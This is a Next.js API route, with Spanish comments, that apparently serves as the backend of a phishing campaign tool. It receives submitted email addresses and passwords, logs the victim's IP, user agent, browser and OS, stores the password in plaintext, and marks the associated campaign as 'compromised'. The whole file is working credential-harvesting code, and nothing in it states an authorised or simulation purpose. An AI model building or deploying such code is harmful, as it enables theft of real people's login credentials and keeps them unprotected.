import { NextRequest, NextResponse } from "next/server";
import { dbConnect } from "@/lib/mongodb";
import Capture from "@/models/Capture";
import Campaign from "@/models/Campaign";
import { parseUserAgent } from "@/lib/userAgent";

export async function POST(req: NextRequest) {
  try {
    await dbConnect();
    const body = await req.json();
    const { email, password, campaignId } = body;

    if (!email) {
      return NextResponse.json(
        { error: "El correo electrónico es requerido." },
        { status: 400 }
      );
    }

    // Obtener IP y User-Agent de los headers
    const userAgent = req.headers.get("user-agent") || "Unknown";
    const xForwardedFor = req.headers.get("x-forwarded-for");
    const ip = xForwardedFor ? xForwardedFor.split(",")[0].trim() : "127.0.0.1";

    // Analizar el User Agent
    const { browser, os } = parseUserAgent(userAgent);

    // 1. Guardar los datos en el modelo de Capture
    await Capture.create({
      campaignId: campaignId || undefined,
      email,
      password,
      ip,
      userAgent,
      browser,
      os,
    });

    // 2. Si hay un ID de campaña asociado, actualizar su estado a 'compromised'
    if (campaignId) {
      const campaign = await Campaign.findById(campaignId);
      if (campaign) {
        campaign.status = "compromised";
        campaign.compromisedAt = new Date();
        await campaign.save();
      }
    }

    return NextResponse.json({ success: true });
  } catch (error: any) {
    console.error("Error en API de captura:", error);
    return NextResponse.json(
      { error: "Error interno al capturar datos.", details: error.message },
      { status: 500 }
    );
  }
}
